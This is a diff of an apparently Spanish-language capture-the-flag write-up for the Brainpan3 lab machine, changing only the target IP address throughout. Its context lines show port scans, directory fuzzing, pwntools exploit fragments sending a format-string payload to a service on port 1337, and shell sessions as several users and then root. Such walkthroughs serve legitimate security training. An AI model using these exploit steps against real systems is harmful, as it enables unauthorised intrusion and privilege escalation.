@@ -150,15 +150,15 @@
 
 <p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde solo encontramos 1 puerto abierto, este es el <code class="language-plaintext highlighter-rouge">1337</code> que no tiene un servicio por defecto.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ nmap </span><span class="p">192.168.100.64
-Nmap scan report for 192.168.100.64
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.6
+Nmap scan report for 192.168.100.6
 PORT     STATE SERVICE
 1337/tcp open  waste</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> al servicio corriendo en el puerto <code class="language-plaintext highlighter-rouge">1337</code> nos recibe un banner con el nombre de la máquina y se nos pide un <code class="language-plaintext highlighter-rouge">codigo</code> para poder acceder.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ netcat </span><span class="p">192.168.100.64 1337
+<code><span class="ve">❯ netcat </span><span class="p">192.168.100.6 1337
 
 
   __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
@@ -260,7 +260,7 @@ ENTER COMMAND:</span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.6"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, </span><span class="no">b</span><span class="s">"%3$d"</span><span class="p">)
 
@@ -275,7 +275,7 @@ shell.interactive(</span><span class="s">""</span><span class="p">)</span>
 <p class="plain-text">Al ejecutarlo automatiza el proceso del <code class="language-plaintext highlighter-rouge">código</code> acceso y entra en modo interactivo que nos pide un nuevo comando, esta vez tenemos diferentes <code class="language-plaintext highlighter-rouge">opciones</code> del 1 al 5.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.6 on port 1337: Done
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 
 --------------------------------------------------------------
@@ -352,8 +352,8 @@ ENTER COMMAND:</span>
 
 <p class="plain-text">Si escaneamos de nuevo los puertos con <code class="language-plaintext highlighter-rouge">nmap</code> podemos encontrar el <code class="language-plaintext highlighter-rouge">8080</code> abierto.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ nmap </span><span class="p">192.168.100.64
-Nmap scan report for 192.168.100.64
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.6
+Nmap scan report for 192.168.100.6
 PORT     STATE SERVICE
 1337/tcp open  waste
 8080/tcp open  http-proxy</span>
@@ -364,12 +364,12 @@ PORT     STATE SERVICE
 
 <p class="plain-text">Fuzzeando por archivos y directorios nos encontramos un <code class="language-plaintext highlighter-rouge">/repo</code> y un <code class="language-plaintext highlighter-rouge">/robots.txt</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.64:8080/FUZZ -t 100 --hc 404
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.6:8080/FUZZ -t 100 --hc 404
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://192.168.100.64:8080/FUZZ
+Target: http://192.168.100.6:8080/FUZZ
 Total requests: 4715
 
 =====================================================================
@@ -431,7 +431,7 @@ YNY</span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.6"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, </span><span class="no">b</span><span class="s">"%3$d"</span><span class="p">)
 
@@ -461,9 +461,9 @@ bar </span><span class="o">= </span><span class="p">log.progress(</span><span cl
 <p class="plain-text">Ejecutamos el script y después de enviar <code class="language-plaintext highlighter-rouge">253</code> el caracter <code class="language-plaintext highlighter-rouge">Y</code> el valor de <code class="language-plaintext highlighter-rouge">REPORT</code> se sobreescribe cambia a <code class="language-plaintext highlighter-rouge">Y</code> por lo que probablemente se habilite y podamos usarlo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py 
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.6 on port 1337: Done
 [</span><span class="ve">+</span><span class="p">] Bytes: 253 [Y]
-[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.64 port 1337</span>
+[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.6 port 1337</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Para automatizar el conseguir el <code class="language-plaintext highlighter-rouge">código</code> para conectarnos y sobreescribir el valor de <code class="language-plaintext highlighter-rouge">REPORT</code> para habilitarlo podemos hacerlo con un pequeño script en python.</p>
@@ -471,7 +471,7 @@ bar </span><span class="o">= </span><span class="p">log.progress(</span><span cl
 <code><span class="c1">#!/usr/bin/python3</span><span class="p">
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.6"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%3$d"</span><span class="p">)
 
@@ -489,7 +489,7 @@ shell.interactive(</span><span class="s">""</span><span class="p">)</span>
 <p class="plain-text">Al ejecutarlo nos otorga el modo interactivo despues de hacer que el valor de <code class="language-plaintext highlighter-rouge">REPORT</code> sea igual <code class="language-plaintext highlighter-rouge">Y</code> por lo que deberíamos poder ejecutar el comando 1 que antes no.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.6 on port 1337: Done
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 --------------------------------------------------------------
 SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
@@ -593,7 +593,7 @@ bash: no job control in this shell
 </span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ id
 uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
 </span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ hostname -I
-192.168.100.64 
+192.168.100.6 
 </span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
 </code></pre></div></div><br>
 
@@ -602,7 +602,7 @@ uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
 <code><span class="c1">#!/usr/bin/python3</span><span class="p">
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.6"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, </span><span class="no">b</span><span class="s">"%3$d"</span><span class="p">)
 
@@ -624,12 +624,12 @@ shell.interactive(</span><span class="s">""</span><span class="p">)</span>
 <p class="plain-text">Aunque al ejecutarlo nos otorga directamente una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario anansi es mejor hacerlo manual para poder tratar la <code class="language-plaintext highlighter-rouge">tty</code> y mejorar la interactividad de la shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.6 on port 1337: Done
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ id
 uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
 </span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ hostname -I
-192.168.100.64
+192.168.100.6
 </span><span class="ve">anansi@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
 </code></pre></div></div><br>
 
@@ -760,7 +760,7 @@ sys.stdout.buffer.write(payload)</span>
 $ whoami
 reynard
 $ hostname -I
-192.168.100.64 
+192.168.100.6 
 $</span>
 </code></pre></div></div><br>
 
@@ -773,7 +773,7 @@ $</span>
 </span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~/private</span><span class="p">$ id
 uid=1002(reynard) gid=1002(reynard) groups=1002(reynard)
 </span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~/private</span><span class="p">$ hostname -I
-192.168.100.64 
+192.168.100.6 
 </span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~/private</span><span class="p">$</span>
 </code></pre></div></div><br>
 
@@ -788,7 +788,7 @@ Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
 tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN
 tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN
-tcp        0      0 192.168.100.64:1337     192.168.100.85:36100    ESTABLISHED
+tcp        0      0 192.168.100.6:1337     192.168.100.85:36100    ESTABLISHED
 </span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 127.0.0.1 7075
 Incorrect key
 </span><span class="ve">reynard@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
@@ -854,7 +854,7 @@ script /dev/null -c bash
 </span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ id
 uid=1001(puck) gid=1001(puck) groups=1001(puck)
 </span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$ hostname -I
-192.168.100.64 
+192.168.100.6 
 </span><span class="ve">puck@brainpan3</span><span class="p">:</span><span class="az">/</span><span class="p">$</span>
 </code></pre></div></div><br>
 
@@ -1378,7 +1378,7 @@ os.chmod(</span><span class="s">"/tmp/foo"</span><span class="p">,</span><span c
 bash-4.3# id
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.3# hostname -I
-192.168.100.64
+192.168.100.6
 bash-4.3#</span>
 </code></pre></div></div><br>
 
@@ -1466,7 +1466,7 @@ bi9iYXNoAFdTieHNgA==</span>
 </span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># id
 uid=0(root) gid=0(root) groups=0(root)
 </span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
-192.168.100.64 
+192.168.100.6 
 </span><span class="ve">root@brainpan3</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
 </code></pre></div></div><br>
 
